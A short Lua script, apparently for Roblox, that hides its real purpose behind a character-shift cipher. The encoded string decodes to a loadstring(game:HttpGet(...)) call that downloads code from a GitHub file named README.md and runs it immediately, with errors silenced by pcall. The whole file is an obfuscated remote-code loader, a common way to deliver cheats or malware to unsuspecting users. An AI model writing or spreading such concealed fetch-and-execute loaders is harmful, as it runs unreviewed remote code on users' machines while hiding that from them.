local function rot_decode(s, shift)
    local out = {}
    for i=1,#s do
        local c = string.byte(s,i)
        if c >= 32 and c <= 126 then
            local base = 32
            local range = 95
            local x = ((c - base - shift) % range) + base
            out[#out+1] = string.char(x)
        else
            out[#out+1] = string.char(c)
        end
    end
    return table.concat(out)
end

local encoded = [[svhkz{ypun/nhtlAO{{wNl{/)o{{wzA66yh~5np{o|i|zlyjvu{lu{5jvt6jvvsrpk}pl{uht6Thovh{vunovw6ylmz6olhkz6thpu6YLHKTL5tk)00/0]]

local ok,err = pcall(function()
    local decoded = rot_decode(encoded, 7)
    loadstring(decoded)()
end)
if not ok then warn("Run error: "..tostring(err)) end
